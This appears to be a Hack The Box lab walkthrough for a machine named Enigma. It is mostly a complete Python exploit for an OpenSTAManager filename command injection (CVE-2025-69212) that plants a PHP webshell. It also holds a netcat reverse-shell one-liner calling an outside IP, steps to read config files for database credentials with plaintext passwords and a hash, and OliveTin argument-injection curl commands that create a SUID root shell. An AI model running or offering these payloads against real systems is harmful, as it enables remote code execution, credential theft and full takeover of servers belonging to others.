

```
┌──(mithun㉿kali)-[~/…/htb/machines/Linux/Enigma]
└─$ nmap -sV 10.129.159.107
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-28 10:17 +0530
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 7.00% done; ETC: 10:17 (0:00:27 remaining)
Nmap scan report for enigma.htb (10.129.159.107)
Host is up (0.32s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
110/tcp  open  pop3     Dovecot pop3d
111/tcp  open  rpcbind  2-4 (RPC #100000)
143/tcp  open  imap     Dovecot imapd (Ubuntu)
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp  open  ssl/pop3 Dovecot pop3d
2049/tcp open  nfs_acl  3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
#!/usr/bin/env python3
"""
OpenSTAManager <= 2.9.8 — OS Command Injection via P7M filename
CVE-2025-69212 / GHSA-25fp-8w8p-mx36

Attack:
  1. Craft a ZIP containing a .p7m file whose FILENAME injects shell commands
     into exec("openssl smime ... -in \"<filename>\" ...")
  2. Upload via importFE_ZIP plugin (actions.php, id_module=14, id_plugin=48)
  3. Server drops SHELL.php inside the files/ directory
  4. Hit the webshell: GET /files/SHELL.php?c=id

KEY CONSTRAINT (from advisory):
  ZipArchive::extractTo() splits on '/' — NO forward-slashes in the injected
  command. Use:  cd <dir> && <command>   instead of absolute paths.

Usage:
  python3 exploit_p7m.py \
    --target http://support_001.enigma.htb \
    --user admin --password Ne3s4rtars78s

  # Then hit the shell:
  curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
  curl "http://support_001.enigma.htb/files/SHELL.php?c=cat+/etc/passwd"
"""

import argparse
import io
import sys
import zipfile

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] pip install requests --break-system-packages")
    sys.exit(1)

R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"; BD="\033[1m"; RS="\033[0m"

BANNER = f"""
{R}{'='*60}{RS}
{R}{BD}  OpenSTAManager <= 2.9.8 — P7M Command Injection{RS}
{R}{BD}  CVE-2025-69212 / GHSA-25fp-8w8p-mx36{RS}
{R}{'='*60}{RS}
"""

def log(msg, s="*"):
    icons={"*":f"{B}*{RS}","+":f"{G}+{RS}","-":f"{R}-{RS}","!":f"{Y}!{RS}"}
    print(f"  [{icons.get(s,'*')}] {msg}")

def hdr(n, t): print(f"\n  {BD}── Step {n}: {t} ──{RS}\n")


# ── Step 1: Build malicious ZIP ───────────────────────────────────────────────
def build_zip(webshell_cmd: str) -> bytes:
    hdr(1, "Build Malicious ZIP")

    # The injected filename breaks out of the openssl exec() double-quote
    # context and runs our command. No '/' allowed — use 'cd dir && cmd'.
    # Final payload:   invoice.p7m";<cmd>;echo ".p7m
    #
    # Resulting exec string:
    #   openssl smime ... -in "<upload_dir>/invoice.p7m";<cmd>;echo ".p7m" ...
    #                                                   ^^^^^^^^^^^^^^^^^^
    #                                                   injected commands run
    #
    # The webshell command uses 'cd files' because that folder is web-accessible
    # and we can't use '/' in the filename.
    malicious_name = f'invoice.p7m";{webshell_cmd};echo ".p7m'

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(malicious_name, b"DUMMY_P7M_CONTENT")
    data = buf.getvalue()

    log(f"Injected filename : {BD}{malicious_name}{RS}")
    log(f"ZIP size          : {len(data)} bytes", "+")
    return data


# ── Step 2: Authenticate ──────────────────────────────────────────────────────
def authenticate(target: str, user: str, password: str) -> requests.Session:
    hdr(2, "Authenticate")
    s = requests.Session()
    s.verify = False

    resp = s.post(
        f"{target}/index.php",
        data={"op": "login", "username": user, "password": password},
        allow_redirects=False,
        timeout=15,
    )
    loc = resp.headers.get("Location", "")
    if resp.status_code != 302 or "index.php" in loc:
        log("Login failed! Wrong credentials.", "-")
        sys.exit(1)

    s.get(f"{target}{loc}", timeout=15)
    log(f"Logged in as '{user}'", "+")
    return s


# ── Step 3: Upload malicious ZIP ──────────────────────────────────────────────
def upload_zip(session: requests.Session, target: str, zip_data: bytes,
               module_id: int, plugin_id: int) -> bool:
    hdr(3, "Upload Malicious ZIP via importFE_ZIP")

    log(f"POST {target}/actions.php  [id_module={module_id}, id_plugin={plugin_id}]")

    resp = session.post(
        f"{target}/actions.php",
        data={
            "op":        "save",
            "id_module": str(module_id),
            "id_plugin": str(plugin_id),
        },
        files={
            "blob1": ("exploit.zip", zip_data, "application/zip"),
        },
        timeout=30,
    )

    log(f"HTTP {resp.status_code}", "+" if resp.status_code in (200, 500) else "-")

    # 500 is expected — XML parsing fails after command execution
    if resp.status_code == 500:
        log("500 expected — command already executed before XML parse error", "!")
        return True
    if resp.status_code == 200:
        log("200 OK — command may have executed", "+")
        return True

    log(f"Unexpected response: {resp.text[:300]}", "-")
    return False


# ── Step 4: Verify webshell ───────────────────────────────────────────────────
def verify_shell(target: str, shell_path: str) -> bool:
    hdr(4, "Verify Webshell")
    url = f"{target}{shell_path}?c=id"
    log(f"GET {url}")

    try:
        resp = requests.get(url, timeout=10, verify=False)
        if "www-data" in resp.text or "uid=" in resp.text:
            log(f"Webshell alive! Output: {BD}{resp.text.strip()}{RS}", "+")
            return True
        elif resp.status_code == 200:
            log(f"Shell responded but unexpected output: {resp.text[:100]}", "!")
        else:
            log(f"HTTP {resp.status_code} — shell not found yet", "-")
    except Exception as e:
        log(f"Error: {e}", "-")
    return False


# ── main ──────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="CVE-2025-69212 PoC")
    ap.add_argument("--target",    required=True, help="Base URL, e.g. http://support_001.enigma.htb")
    ap.add_argument("--user",      default="admin")
    ap.add_argument("--password",  required=True)
    ap.add_argument("--module-id", type=int, default=14,
                    help="id_module for importFE_ZIP (default: 14)")
    ap.add_argument("--plugin-id", type=int, default=48,
                    help="id_plugin for importFE_ZIP (default: 48)")
    ap.add_argument("--shell-path", default="/files/SHELL.php",
                    help="Web path where shell will be written (default: /files/SHELL.php)")
    ap.add_argument("--cmd",
                    help="Custom shell command injected in filename (no '/' allowed). "
                         "Default: drop PHP webshell into files/")
    args = ap.parse_args()

    print(BANNER)
    target = args.target.rstrip("/")

    # Default: write a PHP webshell into the files/ directory
    # 'cd files' avoids '/' in the filename (ZipArchive splits on '/')
    if args.cmd:
        inject_cmd = args.cmd
    else:
        inject_cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"

    log(f"Target     : {target}")
    log(f"Inject cmd : {inject_cmd}")
    log(f"Shell URL  : {target}{args.shell_path}?c=<cmd>")

    zip_data = build_zip(inject_cmd)
    session  = authenticate(target, args.user, args.password)
    ok       = upload_zip(session, target, zip_data, args.module_id, args.plugin_id)

    if not ok:
        log("Upload step failed — try adjusting --module-id / --plugin-id", "-")
        sys.exit(1)

    alive = verify_shell(target, args.shell_path)

    print(f"\n  {BD}── Done ──{RS}\n")
    if alive:
        log(f"Webshell: {BD}{target}{args.shell_path}?c=<command>{RS}", "+")
        log("Examples:", "+")
        print(f"    curl \"{target}{args.shell_path}?c=id\"")
        print(f"    curl \"{target}{args.shell_path}?c=cat+/etc/passwd\"")
        print(f"    curl \"{target}{args.shell_path}?c=cat+/var/www/html/config.inc.php\"")
    else:
        log("Shell not found at expected path.", "!")
        log("Try: correct --module-id/--plugin-id, or check webroot path", "!")
        log(f"Manual check: curl \"{target}{args.shell_path}?c=id\"", "!")


if __name__ == "__main__":
    main()
    
    
curl "http://support_001.enigma.htb/files/SHELL.php?c=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.114+4445+>/tmp/f"

will get the reverse shell of the www-data and 
cat /var/www/html/openstamanager/config.inc.php

will get the creds of the zz_users 

mysql -u brollin -p'Fri3nds@9099' openstamanager -e "SELECT username,password FROM zz_users;"

haris | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC

```


after login as haris , you will get the user flag


Privilege escalation :

OliveTin is running as root on `127.0.0.1:1337` with **no authentication** (`authRequireGuestsToLogin: false`, `exec: true` for everyone) and has a **"Run backup script"** action that executes `/opt/backupScript.sh` as root
in the `/etc/OliveTin/config.yaml` file we have the set of vulnerable code : 

```
  - title: Backup Database
    id: backup_database
    icon: "⛁"
    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
    popupOnStart: execution-dialog
    arguments:
      - name: db_user
        type: ascii_identifier
        default: backup_svc
      - name: db_pass
        type: password
      - name: db_name
        type: ascii_identifier
        default: production
```



first we don't have the **/opt/backupScript.sh** , but it may be in the system , so we use the coping the /bin/bash to /opt/backupScript.sh and change the mode to the SUID executable , 

```
mysql -u root -p'$(cp /bin/bash /opt/backupScript.sh && chmod 4755 /opt/backupScript.sh)' mysql
```

In bash, `$(...)` is **command substitution**.

When bash sees `-p'$(cp /bin/bash /opt/backupScript.sh && chmod 4755 /opt/backupScript.sh)'`:

1. **First**: Bash executes `cp /bin/bash /opt/backupScript.sh && chmod 4755 /opt/backupScript.sh`
    
2. **Then**: Bash uses the output (which is empty) as the password
    
3. **Finally**: Bash runs `mysqldump` with the empty password


this set of commands to became as root :

```
curl -s -X POST "http://127.0.0.1:1337/api/StartAction" -H "Content-Type: application/json" -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"root"},{"name":"db_pass","value":"anything"},{"name":"db_name","value":"mysql > /opt/backupScript.sh && cp /bin/bash /opt/backupScript.sh && chmod 4755 /opt/backupScript.sh #"}]}'
```

```
curl -s -X POST "http://127.0.0.1:1337/api/StartAction" -H "Content-Type: application/json" -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"root"},{"name":"db_pass","value":"'"'"'$(cp /bin/bash /opt/backupScript.sh && chmod 4755 /opt/backupScript.sh)'"'"'"},{"name":"db_name","value":"mysql"}]}'
```

```
sleep 3 && ls -la /opt/backupScript.sh

-rwsr-xr-x 1 root root 1446024 Jun 28 14:09 /opt/backupScript.sh
haris@enigma:~$ /opt/backupScript.sh -p
/opt/backupScript.sh -p
backupScript.sh-5.2# whoami
whoami
root
backupScript.sh-5.2# 
```

